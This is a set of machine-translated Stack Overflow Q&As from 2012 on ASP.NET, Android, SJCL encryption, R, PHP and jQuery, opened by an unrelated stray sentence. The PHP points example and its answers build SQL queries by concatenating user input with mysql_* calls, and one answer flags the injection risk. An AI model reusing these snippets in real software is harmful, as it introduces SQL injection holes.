你可以比较一下功耗。编写每个代码所花费的时间可能也很重要，因为它反映了项目的总成本。如果代码在不同的硬件上运行，硬件的成本也可以包括在内。结合起来，这些数字可以为您提供每个解决方案的实施和运营总成本。

# asp.net-mvc - 网格中的自定义命令按钮未更新部分视图

> ID：13841575
> 
> 赞同：0
> 
> 时间：2012-12-12T14:07:41.540
> 
> 标签：asp.net-mvc, razor, grid, kendo-ui, partial-views

我创建了一个示例项目来说明我的问题

**索引.cshtml：**

```
@using Kendo.Mvc.UI
@model IEnumerable<KendoUIMvcApplication3.Models.Product>
@{
    ViewBag.Title = "Home Page";
}
<script type="text/javascript">
    function clickView(e) {
        e.preventDefault();
        var dataItem = this.dataItem($(e.currentTarget).closest("tr"));
        $.ajax({
            url: "/Home/ViewDetails",
            data: { productId: dataItem.Id }
        });
    }
</script>
<div>
    @(Html.Kendo().Grid(Model)
          .Name("RoleGrid")
          .Columns(columns =>
              {
                  columns.Bound(p => p.Id);
                  columns.Bound(p => p.Name).Width("30%");
                  columns.Bound(p => p.Description);
                  columns.Command(command =>
                      {
                          command.Edit();
                          command.Destroy();
                          command.Custom("View").Click("clickView");
                      }).Width(250);
              })
          .ToolBar(toolbar => toolbar.Create().Text("Add"))
          .Sortable()
          .Scrollable()
          .HtmlAttributes(new { style = "height: 350px" })
</div>

@{ Html.RenderAction("ViewDetails", "Home", new { productId = 0 });} 
```

**我的 HomeController 中的 ViewDetails 操作：**

```
public ActionResult ViewDetails(int productId)
{
    Detail model;
    if (productId == 0)
    {
        model = new Detail
            {
                Price = "zero",
                Origin = "zero"
            };
    } else {
        model = new Detail
            {
                Price = productId.ToString(),
                Origin = productId.ToString()
            };
    }
    return View(model);
} 
```

**查看详细信息.cshtml：**

```
@model KendoUIMvcApplication3.Models.Detail
@{
    ViewBag.Title = "ViewDetails";
    Layout = null;
}

@Html.DisplayFor(m => m.Price)
@Html.DisplayFor(m => m.Origin) 
```

一切运行良好。

单击自定义“查看”按钮会触发 javascript，从而对我的`ViewDetails`操作进行 ajax 调用。该`productId`值已正确传递，但是，`return(model)`我的`ViewDetails`操作根本不会更新我的视图页面。

我不应该`RenderAction`在我的 index.cshtml 中使用吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T20:30:21.003

要在单击任何按钮时在 Grid 下显示该 Partial 视图，您应该使用 $.ajax 的**成功**回调函数。

```
@using Kendo.Mvc.UI
@model IEnumerable<KendoUIMvcApplication3.Models.Product>
@{
    ViewBag.Title = "Home Page";
}
<script type="text/javascript">
    function clickView(e) {
        e.preventDefault();
        var dataItem = this.dataItem($(e.currentTarget).closest("tr"));
        $.ajax({
            url: "/Home/ViewDetails",
            data: { productId: dataItem.Id },
            success:function(response){
                $('#viewDetails').html(response);
            }
        });
    }
</script>
<div>
    @(Html.Kendo().Grid(Model)
          .Name("RoleGrid")
          .Columns(columns =>
              {
                  columns.Bound(p => p.Id);
                  columns.Bound(p => p.Name).Width("30%");
                  columns.Bound(p => p.Description);
                  columns.Command(command =>
                      {
                          command.Edit();
                          command.Destroy();
                          command.Custom("View").Click("clickView");
                      }).Width(250);
              })
          .ToolBar(toolbar => toolbar.Create().Text("Add"))
          .Sortable()
          .Scrollable()
          .HtmlAttributes(new { style = "height: 350px" })
</div>

<div id="viewDetails"></div> 
```

# java - 应用程序从 res/raw/pdf 文件加载 pdf 文件

> ID：13841576
> 
> 赞同：0
> 
> 时间：2012-12-12T14:07:45.863
> 
> 标签：java, android

嗨，我正在尝试从原始文件夹加载 PDF 文件，但是当我按下按钮时没有任何反应，请帮助我。这是代码

公共类 openpdf 扩展 Activity {

```
@Override
public void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    Button button = (Button) findViewById(R.id.pdfbutton);
    button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v)
            {

                File pdfFile = new File(
                    "android.resource://com.mycompany.myapp.PDF/"
                    + R.raw.adham);
                Uri path = Uri.fromFile(pdfFile);
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                intent.setDataAndType(path, "application/pdf");

                startActivity(intent);
            }
        }
    );
} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T05:59:31.127

这是示例：

```
package fortyonepost.com.lfas;//Created by DimasTheDriver Apr/2011\.  

import java.io.ByteArrayOutputStream;  
import java.io.IOException;  
import java.io.InputStream;  

import android.app.Activity;  
import android.content.res.Resources;  
import android.os.Bundle;  
import android.util.Log;  
import android.widget.Toast;  

public class LoadFromAltLoc extends Activity {  

    //a handle to the application's resources  
    private Resources resources;  
    //a string to output the contents of the files to LogCat  
    private String output;  

    /** Called when the activity is first created. */  
    @Override  
    public void onCreate(Bundle savedInstanceState)  
    {  
        super.onCreate(savedInstanceState);  
        setContentView(R.layout.main);  

        //get the application's resources  
        resources = getResources();  

        try  
        {  
            //Load the file from the raw folder - don't forget to OMIT the extension  
            output = LoadFile("from_raw_folder", true);  
            //output to LogCat  
            Log.i("test", output);  
        }  
        catch (IOException e)  
        {  
            //display an error toast message  
            Toast toast = Toast.makeText(this, "File: not found!", Toast.LENGTH_LONG);  
            toast.show();  
        }  

        try  
        {  
            //Load the file from assets folder - don't forget to INCLUDE the extension  
            output = LoadFile("from_assets_folder.pdf", false);  
            //output to LogCat  
            Log.i("test", output);  
        }  
        catch (IOException e)  
        {  
            //display an error toast message  
            Toast toast = Toast.makeText(this, "File: not found!", Toast.LENGTH_LONG);  
            toast.show();  
        }  
    }  

    //load file from apps res/raw folder or Assets folder  
    public String LoadFile(String fileName, boolean loadFromRawFolder) throws IOException  
    {  
        //Create a InputStream to read the file into  
        InputStream iS;  

        if (loadFromRawFolder)  
        {  
            //get the resource id from the file name  
            int rID = resources.getIdentifier("fortyonepost.com.lfas:raw/"+fileName, null, null);  
            //get the file as a stream  
            iS = resources.openRawResource(rID);  
        }  
        else  
        {  
            //get the file as a stream  
            iS = resources.getAssets().open(fileName);  
        }  

        //create a buffer that has the same size as the InputStream  
        byte[] buffer = new byte[iS.available()];  
        //read the text file as a stream, into the buffer  
        iS.read(buffer);  
        //create a output stream to write the buffer into  
        ByteArrayOutputStream oS = new ByteArrayOutputStream();  
        //write this buffer to the output stream  
        oS.write(buffer);  
        //Close the Input and Output streams  
        oS.close();  
        iS.close();  

        //return the output stream as a String  
        return oS.toString();  
    }  
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:15:53.083

只需使用它从原始文件夹中读取您的 pdf 文件

```
int rID = resources.getIdentifier("fortyonepost.com.lfas:raw/"+fileName, null, null);  

iS = resources.openRawResource(rID); 
```

# javascript - 当 PassPhrase 相同时，需要 SJCL 进行相同的加密 AES 256 输出

> ID：13841581
> 
> 赞同：1
> 
> 时间：2012-12-12T14:08:17.347
> 
> 标签：javascript, node.js, file-upload, cryptography, aes

我正在使用 Node.js 上传在客户端加密的文件，我使用 SJCL（Stanford Javascript Crypto Library）用 Javascript 加密文件。

但我注意到即使使用相同的密码短语，加密的输出或结果总是不同的。

经过几次研究后，我发现这是因为盐每次都是随机的，我需要做一个“nosalt”（对不起，我对这里的所有密码都是新手，Node.js）

每次密码相同时，如何更改我的代码（或 SJCL 代码）以生成精确的加密输出。

我的应用基于“Cryptloader”项目，你可以在这里找到它：[https ://github.com/Kryil/Cryptloader](https://github.com/Kryil/Cryptloader)

加密：

```
var part = file_queue[data["id"]].slice(start, end)

var reader = new FileReader()
reader.onload = function(e)
{
var passwd = document.getElementById("password").value

console.log("Uploading arraybuffer of size " + e.target.result.byteLength)
var i32a = new Int32Array(e.target.result)

var out = i32a.toJSONArray()

console.log("crypting: " + out)

var crypted = sjcl.encrypt(passwd, out)

ws.send(JSON.stringify({
      "type": "fileslice",
      "data": {"id": data["id"], "slice": slice, "data": crypted}
}))
}
reader.readAsArrayBuffer(part) 
```

解密：

```
var decrypted = sjcl.decrypt(passwd, data["data"])

file_contents[file]["data"].push(new Int32Array(JSON.parse(decrypted))) 
```

这是无关紧要的问题，但并非所有文件都正确上传，其中一些会产生错误，但是当我将 Int32Array 更改为 Int16Array 或 Int8Array 时，它对它们有效，但对其他文件产生错误，是什么原因以及如何修复它。错误：

```
Uncaught RangeError: ArrayBuffer length minus the byteOffset is not a multiple of the element size.
(Chrome Latest version, Win 7) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T16:53:00.253

不仅`salt`是使密文每次都不同的原因`iv`。但是这些都是提供语义安全的安全功能，您确实不应该禁用并且也不应该禁用，因为盐和 iv 可以包含在密文中，没有任何东西可以阻止您以后解密通过使用随机`salt`或`iv`.

That said the `encrypt` function you are using lets you pass your own filled out parameters for the crypto including `salt` and `iv`, but to hard-code those to a fixed value (I would like to **strongly** point out) is **not** the api intention and an abuse of the api.

# c# - 如何获取生成异常的文件的名称

> ID：13841589
> 
> 赞同：0
> 
> 时间：2012-12-12T14:08:43.947
> 
> 标签：c#, asp.net, exception

如何获取生成异常的文件的名称。

前任。添加用户.aspx

```
try
{ 
    SaveUser(); 
}
catch (Exception ex)
{
    response.wrhite(ex.GETPAGE().toString());
}

return addUser.aspx; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:15:16.970

对于 ASP.NET 中的 C#，您可以在 Global.asax 中的 Application_Error 事件期间通过 Request 对象获取它。

```
protected void Application_Error(object sender, EventArgs e)
{
// some code here
String url = Request.Url.ToString()
// some more code here
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:15:15.777

不完全是文件，但`class`在[`ex.Source`](http://msdn.microsoft.com/en-us/library/system.exception.source.aspx).

您可以使用 访问当前请求的 URL [`HttpContext.Current.Request.Url`](http://msdn.microsoft.com/en-us/library/system.web.httprequest.url.aspx)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T14:42:59.943

不幸的是，该`Exception`课程没有关于您要查找的内容的任何信息。[正如 Yahia 在这里指出](https://stackoverflow.com/a/13841723/237838)的那样，您可以从异常中获取类名，但正如您所发现的，这对于查找 ASPX 路径并没有真正的帮助。

[正如Graham 所说](https://stackoverflow.com/a/13841724/237838)，最好的办法是使用`Request.Url.ToString()`异常处理程序内部的方法。由于您的代码是从与您的页面相关的 ASPX.cs 内部运行的，因此该对象可用于此。`Request`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T14:49:50.640

这是一个丑陋的答案，我不推荐：

如果异常来自实际页面（而不是项目中其他位置的 DLL 或其他类），则 StaceTrace 具有页面文件名。这是在本地为我抛出的一个简单页面和方法的跟踪：

```
at WebApp2.ExceptionPage.BlowUp() in C:\Users\gpeel\Desktop\Documents\Visual Studio 2010\Projects\GPTestBed\WebApp2\Exception.aspx.cs:line 27 at WebApp2.ExceptionPage.Page_Load(Object sender, EventArgs e) in C:\Users\gpeel\Desktop\Documents\Visual Studio 2010\Projects\GPTestBed\WebApp2\Exception.aspx.cs:line 16 
```

您可以通过查找短语“.aspx.cs”的第一个实例来梳理出该文件名，然后在字符串中向左移动直到找到第一个“\”字符。这会给你上面的“Exception.aspx.cs”。

我强烈建议您重新编写代码以处理 Application_Error 中的 Exception 对象，即使是 global.asax 也是如此。在该事件中调用*Server.GetLastError().GetBaseException()*以获取引发的异常，并调用*Request.Url*以获取页面。

# google-maps - 使用 Google Maps API v3 使用 KML 模拟点击标记

> ID：13841597
> 
> 赞同：0
> 
> 时间：2012-12-12T14:09:13.987
> 
> 标签：google-maps, google-maps-markers, kml

我正在使用 kml 文件在地图上创建标记。

我需要通过单击知道纬度和经度线的外部元素（是 div）来模拟对标记的单击以打开信息窗口。

我可以做什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T15:01:11.953

~~这里至少有两个选项：~~

一种选择：

*   使用第三方 KML 解析器（如[geoxml3](http://code.google.com/p/geoxml3/)或[geoxml-v3](http://code.google.com/p/geoxml-v3/)）呈现您的 KML，将 KML 呈现为本机 Google Maps API v3 对象，保留对它们的引用并使用它们触发对象上的点击事件（适用于标记、多边形和polylines)，失去了基于 KmlLayer 平铺渲染的优势。

[使用 geoxml3 的示例](http://www.geocodezip.com/geoxml3_test/v3_geoxml3_kmltest_linktoB.html?filename=VoterDistricts_address.xml)

~~**不再可用，FusionTables 已于 2019 年 12 月 3 日停用** - 将您的 KML 导入 FusionTables，然后在需要时查询表中的数据以创建信息窗口（**注意：这不再有用，Fusion Tables 已关闭于 2019 年 12 月 3 日下降**）~~

~~[使用 FusionTables 的示例](http://www.geocodezip.com/geoxml3_test/v3_FusionTables_Watershed_Stewards_Map_sidebar2.html)~~

# r - 使用 R 计算数组中出现的频率

> ID：13841599
> 
> 赞同：10
> 
> 时间：2012-12-12T14:09:16.817
> 
> 标签：r

我有一个数组

```
a <- c(1,1,1,1,1,2,3,4,5,5,5,5,5,6,7,7,7,7) 
```

我想使用一些命令来告诉我哪个是数组中最常见的数字？

有一个简单的命令吗？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-12-12T14:17:57.647

该`table()`功能足以满足此要求，如果您的数据具有多个*模式*，则该功能特别有用。

考虑以下选项，所有与`table()`和相关`max()`。

* * *

```
# Your vector
a = c(1,1,1,1,1,2,3,4,5,5,5,5,5,6,7,7,7,7)

# Basic frequency table
table(a)
# a
# 1 2 3 4 5 6 7 
# 5 1 1 1 5 1 4 

# Only gives me the value for highest frequency
# Doesn't tell me which number that is though
max(table(a))
# [1] 5

# Gives me a logical vector, which might be useful
# but not what you're asking for in this question
table(a) == max(table(a))
# a
#    1     2     3     4     5     6     7 
# TRUE FALSE FALSE FALSE  TRUE FALSE FALSE 

# This is probably more like what you're looking for
which(table(a) == max(table(a)))
# 1 5 
# 1 5 

# Or, maybe this
names(which(table(a) == max(table(a))))
# [1] "1" "5" 
```

如评论中所述，在某些情况下，您可能希望查看两个或三个最常出现的值，在这种情况下`sort()`很有用：

```
sort(table(a))
# a
# 2 3 4 6 7 1 5 
# 1 1 1 1 4 5 5 
```

您还可以设置要在表中返回的值的阈值。例如，如果您只想返回那些多次出现的数字：

```
sort(table(a)[table(a) > 1])
# a
# 7 1 5 
# 4 5 5 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-11-05T22:45:00.727

使用`table()`功能：

```
## Your vector:
a <- c(1,1,1,1,1,2,3,4,5,5,5,5,5,6,7,7,7,7)

## Frequency table
> counts <- table(a)

## The most frequent and its value
> counts[which.max(counts)]
# 1
# 5

## Or simply the most frequent
> names(counts)[which.max(counts)]
# [1] "1" 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-12T16:21:42.503

我写了一些个人代码来查找模式和更多内容（几年前。正如阿南达所展示的，这是非常明显的东西）：

```
smode<-function(x){
    xtab<-table(x)
    modes<-xtab[max(xtab)==xtab]
    mag<-as.numeric(modes[1]) #in case mult. modes, this is safer
    #themodes<-names(modes)
    themodes<-as.numeric(names(modes))
    mout<-list(themodes=themodes,modeval=mag)
    return(mout)
    } 
```

Blah blah 版权所有 blah blah 随心所欲地使用，但不要从中赚钱。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T14:13:55.310

您想要的是数据的模式：计算它有多种不同的选项。modeest 包有一组用于模式估计的函数，但对于你想要的可能有点过分了。

也可以看看：

[是否有用于查找模式的内置功能？](https://stackoverflow.com/questions/2547402/standard-library-function-in-r-for-finding-the-mode)

[如何在 R 中计算条件模式？](https://stackoverflow.com/questions/7185392/how-to-compute-conditional-mode-in-r)

希望有帮助

# php - 在 Web 应用程序中使用不同的域和 URL

> ID：13841602
> 
> 赞同：1
> 
> 时间：2012-12-12T14:09:20.210
> 
> 标签：php, html, web-applications, url-routing

## 背景

我有一个在我自己的服务器上托管的 Web 应用程序。我有客户按原样使用该应用程序，但有些人询问他们是否可以在自己的服务器上“托管”该应用程序。这使他们能够拥有自己的 URL，而不是我的。该应用程序仅构成其网站的一部分，因此我假设我的服务器无法响应对其域的直接调用等

举一些例子，我目前有一些网址，比如`www.mydomain.com/profile`，`www.mydomain.com/index.php?option=someoption&view=someview&id=1`我的客户想要什么`www.theirdomian.com/profile`，`www.theirdomian.com/index.php?option=someoption&view=someview&id=1`等等

## 问题

我的问题是，让他们在我的应用程序中使用他们自己的 URL，而不给他们所有的后端源代码和数据库以安装在他们的服务器上的最佳方式是什么？

我真的不想让他们“托管”我的应用程序。但确实希望他们能够使用自己的 URL，而无需修改我服务器上的任何内容。

我认为的一种方法是在他们的服务器上创建一个 router.php 文件。当在客户端站点上单击链接时，路由器接收请求并修改 url 以从我的服务器等获取数据。路由它们通过调用 URL 将 html 源输出回客户端站点。

这是实现我想要的有效方法，还是偏离目标。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:14:53.907

这可能对您的需求来说太先进了，但是......

你能不能创建一些他们可以利用的基本 API，这将使他们可以自由地以自己的方式使用，同时你可以控制它的行为。

API 只需要 cURL 和一些简单的 XML

有很多方法可以完成你想要的，包括 mod_rewrite 规则。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T15:15:01.630

首先，您网站中的链接不应该是硬编码的。如果您`www.mydomain.com/...`到处都进行了硬编码……祝您好运。您应该使用相对于服务器根目录的 URL，例如：

```
<a href="/profile"> 
```

为了获得更大的灵活性，请使用创建相对于应用程序运行位置的 URL 的帮助程序，而不是硬编码任何 URL。如果这样做了，使用不同域名访问同一站点所需要做的就是配置 Web 服务器，使其接受域名请求并设置 DNS 条目`theirdomain.com`以指向您的服务器。

如果这不是一个选项，那么运行的人`theirdomain.com`应该运行一个**反向代理**，在他们的域下为您的域提供服务。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T15:39:26.650

好的！

假设您在[http://www.mydomain.com/listener.php上托管了一个 PHP 文件](http://www.mydomain.com/listener.php)

接收帖子数据

```
$Data = file_get_contents("php://input"); 
```

此示例中发布的数据是 XML

```
<Myapp>
 <method="InitFunction"/>
 <User id="1234"/>
</Myapp> 
```

此处发布的数据是从一个 PHP 文件（即您的 API）传递的，该文件只是从客户端输入中读取数据（因为 API 在客户端服务器上）

API 使用 cURL 发布到您的文件，即[http://www.mydomain.com/listener.php](http://www.mydomain.com/listener.php)

然后根据发生的情况，您可以响应，即打印或 ECHO 将响应返回给 API。

检查 php.net 站点在 cURL 上的使用情况 - 使用起来非常简单

# iphone - 升级到 2.2.0 后 Phonegap 崩溃

> ID：13841606
> 
> 赞同：2
> 
> 时间：2012-12-12T14:09:24.400
> 
> 标签：iphone, ios, cordova, crash

我刚刚将 iOS 应用程序中的 Phonegap 升级到了 2.2.0 版。

当我在我的设备上运行它时，我收到此错误并且应用程序在启动期间崩溃：

```
2012-12-12 15:01:17.810 MyProject.de[662:907] -[__NSCFBoolean isEqualToString:]: unrecognized selector sent to instance 0x3da29530
2012-12-12 15:01:17.812 MyProject.de[662:907] *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[__NSCFBoolean isEqualToString:]: unrecognized selector sent to instance 0x3da29530'
*** First throw call stack:
(0x3b9152a3 0x3580497f 0x3b918e07 0x3b917531 0x3b86ef68 0xc62bb 0x1671f 0x34a6658d 0x34aa6d71 0x34aa2ae5 0x34ae41c9 0x15a03 0x34aa7ad1 0x34aa765b 0x34a9f843 0x34a47c39 0x34a476cd 0x34a4711b 0x39c2a5a3 0x39c2a1d3 0x3b8ea173 0x3b8ea117 0x3b8e8f99 0x3b85bebd 0x3b85bd49 0x34a9e47d 0x34a9b2f9 0x153f9 0x15390)
libc++abi.dylib: terminate called throwing an exception 
```

是什么赋予了？

* * *

**更新：**我通过浏览代码并逐步删除行进行了一些研究。

据我所知，崩溃发生在*didFinishLaunchingWithOptions*的两个地方：

一个在这里：`self.viewController.useSplashScreen = YES;`

另一个在这里`[self.window makeKeyAndVisible];`

如果我删除这两行，应用程序不会崩溃，但也不会加载我的 index.html

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-12T15:10:11.947

我找到了问题的原因。这是 Cordova.plist 文件中的错误/弃用值。

要修复它，请打开 Cordova.plist 并找到“BackupWebStorage”条目。

**将类型**从 Boolean更改为 String，并将**值**从“YES”更改为“cloud”。

这为我解决了这个问题。

# jquery - 带有 asp.net 中继器的 Jquery 数据表插件

> ID：13841609
> 
> 赞同：0
> 
> 时间：2012-12-12T14:09:28.330
> 
> 标签：jquery, asp.net, datatables, repeater

我正在使用 jQuery 数据表插件进行分页和搜索。我在转发器上应用它，它在客户端工作正常。

如何在服务器端更改它，以便我可以将参数值从下拉列表传递到存储过程以仅获取所需的数据行？

简而言之，我的意思是自定义分页。现在我在页面加载时将所有数据行从表绑定到转发器。如何将参数传递给它？

下面看一下aspx页面

```
$(document).ready(function () {
        $('#TblDataTable').dataTable({

            "bJQueryUI": true,
            "bSort": true,
            //    "bServerSide": true,
            "sAjaxSource": "/Productindex.aspx/LoadProductList()",
            "fnServerData": function (sSource, aoData, fnCallback) {
                $.ajax({
                    "type": "POST",
                    "dataType": 'json',
                    "contentType": "application/json; charset=utf-8",
                    "url": sSource,
                    "data": "{'sEcho': '" + aoData[0].value + "'}",
                    "success": fnCallback
                });
            },
            // "bProcessing": true,
            "sPaginationType": "full_numbers",
            "iDisplayLength": 10,
            "sLengthMenu": "Page Size",

            "aLengthMenu": [[5, 10, 15, 25, 50, 100, 150, 200], [5, 10, 15, 25, 50, 100, 150, 200]],
            "aoColumns": [
                   { "bSearchable": true },
                   { "bSearchable": false },
                   { "bSearchable": false },
                   { "bSearchable": false },
                   { "bSearchable": false },
                   { "bSearchable": true },
                   { "bSearchable": false },

            ],

        });
    });<script> 
```

下面是我在页面加载时在 C# 中所做的我正在调用此方法

```
 public void LoadProductList()
  {
        Products objProducts;

        List<Products> objProductlist;

        try
        {
            objProducts = new Products();
            objProductlist = objProducts.GetProductList();
            rptProduct.DataSource = objProductlist;
            rptProduct.DataBind();
        }
        catch (Exception ex)
        {
            throw ex;
        }
        finally
        {
        }
    } 
```

我想要的是将一些参数传递给该`GetProductList`方法以仅获取相关数据。我的意思是如果我从下拉列表中选择 5，那么我将获取 5 行

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T15:16:36.937

我从来没有用过这种插件，但我可以说重点在于方法

```
$.ajax({
                "type": "POST",
                "dataType": 'json',
                "contentType": "application/json; charset=utf-8",
                "url": sSource,
                "data": "{'sEcho': '" + aoData[0].value + "'}",
                "success": fnCallback
}); 
```

我不知道你有没有用过这个，但你应该首先将方法 LoadProductList 标记为静态方法并使用属性 [WebMethod]。然后在此方法的签名中添加参数，例如：

```
[WebMethod]
public static [List<Produit>] LoadProductList(int rows) 
```

应使用 [Serializable] 属性将产品描述为可序列化。然后，服务器端就可以了，但我建议用控制台程序或soupUI测试它现在，我们可以返回客户端了。在方法 $.ajax 中查看这一行

```
"data": "{'sEcho': '" + aoData[0].value + "'}", 
```

您应该将 'sEcho' 替换为行，并将 aoData[0].value 替换为您想要返回的行数。然后在方法 fnCallback 中，我认为您应该传递一个带有其签名的函数对象，如方法（结果），在此方法中，您可以使用 result.d 来获取服务器端的方法 LoadProductList 传递的结果。对于测试，如果 jQuery 使用 d，您可以尝试使用 console.log([object of javascript]) 来记录 result 和 result.d。

顺便说一句，我在你的脚本中找到了这一行

```
"sAjaxSource": "/Productindex.aspx/LoadProductList()", 
```

我认为你应该确保路径是正确的，如果不是，你应该使用 ../ 跳转到父级并且不需要'()'（如果这个属性就像你在 $.ajax 中使用的 sSource，并且您应该将正确的方法路径传递给参数 sSource，它可能类似于“%parent%/Productindex.aspx/LoadProductList”）。

我希望这个简短的描述可以回答你的问题。

# c# - 如何在浮点数之后将十进制转换为不带部分的字符串，如果它为零，并且采用特定的货币格式？

> ID：13841610
> 
> 赞同：1
> 
> 时间：2012-12-12T14:09:31.557
> 
> 标签：c#, formatting, tostring

例如我有几个小数：

```
decimal[] arr = { 1, (decimal)1.1, (decimal)1.00 }; 
```

它们代表俄罗斯卢布的价格：

```
var overrideCulture = new System.Globalization.CultureInfo("ru-RU"); 
```

当我使用：

```
foreach (var d in arr)
{
     string s = d.ToString("c", overrideCulture);
     Console.WriteLine(s);
} 
```

我明白了

```
1,00p.
1,10p.
1,00p. 
```

结果，但我需要的是，如果分数为零，我不希望它显示，但我需要保持货币格式。在这个例子中，我想得到：

```
1p.
1,10p.
1p. 
```

我可以简单地得到以下分数：

```
foreach (var d in arr)
{
     string s = d.ToString("#.##", overrideCulture);
     Console.WriteLine(s);
} 
```

但货币格式会丢失。

```
string s = d.ToString("#.##c", overrideCulture); 
```

也不起作用，我得到`1c`或`1,1c`

有没有一些不棘手的方法来获得我需要的这种格式？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:15:01.057

我不知道可以做到这一点的单个格式字符串，但一种方法是：

```
string format = (d == Math.Round(d,0)) ? "c0" : "c";
string s = d.ToString(format, overrideCulture); 
```

如果 d 可能有超过 2 位小数，并且您不想显示任何要四舍五入`.00`尝试的值的小数

```
string format = (Math.Round(d,2) == Math.Round(d,0)) ? "c0" : "c";
string s = d.ToString(format, overrideCulture); 
```

As a side note you can avoid a cast be defining the constants as decimal literals:

```
decimal[] arr = { 1m, 1.1m, 1.00m }; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:18:25.600

```
string res = @decimal.ToString(@decimal == decimal.Truncate(@decimal) ? "c0" : "c", culture); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:23:48.267

Perhaps you can simply append the currency symbol:

```
string symbol = overrideCulture.NumberFormat.CurrencySymbol;
foreach (var d in arr)
{
    string s = d.ToString("#.##", overrideCulture) + symbol;
    Console.WriteLine(s);
} 
```

# php - 使用 array_count_values 计数数组

> ID：13841612
> 
> 赞同：1
> 
> 时间：2012-12-12T14:09:41.057
> 
> 标签：php, arrays

我的 PHP 脚本

```
 $file_carrito=file("carrito.dat");

    $x=0;

    for($i=0;$i<sizeof($file_carrito);$i++)
    {
    $array_products_1[]=$file_carrito[$i];

    $x++;
    }

echo (array_count_values($array_products_1)); 
```

在这个简单的文件 .dat 中，存储用户添加的所有产品，并在每个案例中计算每个 id 和案例的产品总数

例如，我可以将一个产品的 5 个 id 和其他产品 id 的其他 4 个放入文件中，最后，这必须计算存储到 de dat 文件中的具有相同 id 的产品

例如：5支铅笔、3把椅子、2张桌子等等......

```
The problem it´s no works : echo (array_count_values($array_productos_1)); 

content of carrito.dat :

p1
p1
p1
p3
p3
p3
p2
p2
p2
p1
p1

With this function of array i want get :

Product p1 ---- (5)
Product p2 ----- (3) , etc 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:39:46.103

像这样计算你的价值观

```
$array = array('x', 'x', 'x', 'x', 'y', 'y');
$counts = array();
foreach($array as $value) {
    $counts[$value] = array_key_exists($value, $counts) ? $counts[$value]+1 : 1;
}

print_r($counts); 
```

在你的情况下。数组填充

```
$array = explode("\n", file_get_contents(...)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:48:27.333

简单的方法：

```
$data = file('carrito.dat');

print_r(array_count_values($data)); 
```

它将显示如下内容：

```
Array
(
    [p1] => 5
    [p3] => 3
    [p2] => 3
) 
```

# php - 输入mysql php后更新

> ID：13841613
> 
> 赞同：0
> 
> 时间：2012-12-12T14:09:42.470
> 
> 标签：php, mysql, sql, database

我有一个积分系统，我希望人们在输入/表格后再获得 1 分。直到现在我使用这个代码：

```
<?php
session_start();
//=============Configuring Server and Database=======
$host        =    'localhost';
$user        =    'root';
$password    =    '';
//=============Data Base Information=================
$database    =    'login';

$conn        =    mysql_connect($host,$user,$password) or die('Server Information is not Correct'); //Establish Connection with Server
mysql_select_db($database,$conn) or die('Database Information is not correct');

//===============End Server Configuration============

//=============Starting Registration Script==========

$username    =    mysql_real_escape_string($_POST['txtusername']);

//=============To Encrypt Password===================

//============New Variable of Password is Now with an Encrypted Value========

if(isset($_POST['btnRegister'])) //===When I will Set the Button to 1 or Press Button to register
{
$query = mysql_query("SELECT * FROM quiz WHERE username='$username'");
if(mysql_num_rows($query) > 5 ){
echo "Sorry but you can only take a quize once:S";

}else{

$insert = "UPDATE `users` SET `points` = '".$points."' +1 WHERE `username` = '".$username."'";

 mysql_query($insert); 

mysql_query ("insert into quiz(username)values('$username')");
header('location: succes.php');
}
}
?> 
```

但是这段代码似乎没有更新/添加 1，但它用 1 替换了那里的数字。所以如果我有 5 并且我运行这段代码，它会替换为 1，那么它会说 1。我该如何修复它添加/更新？因此，如果一个人有 3 分并运行代码，他会在获得 repacec 后获得 4 分：

```
$insert = "UPDATE `users` SET `points` = '".$points."' +1 WHERE `username` = '".$username."'"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:12:38.837

你不需要使用变量`$points`。使用以下`UPDATE`查询，

```
$insert = "UPDATE `users` SET `points` = (`points` + 1) WHERE `username` = '".$username."'"; 
```

请注意，上面的查询很容易受到攻击`SQL Injection`，请阅读下面的文章以保护它，

*   [如何防止 PHP 中的 SQL 注入？](https://stackoverflow.com/questions/60174/how-to-prevent-sql-injection)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:14:07.077

我看不出你在哪里定义`$points`，但如果它只是增加 1

怎么样

```
$insert = "UPDATE `users` SET `points` = `points`+1 WHERE `username` = '".$username."'"; 
```

这样，您不需要在变量中获取初始点

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:13:37.123

我唯一的猜测是 $points 没有设置。你能做一个 echo $points; 就在查询之前？

# javascript - 如何将 vbscript Mid 函数转换为带有 2 个参数的 javascript？

> ID：13841615
> 
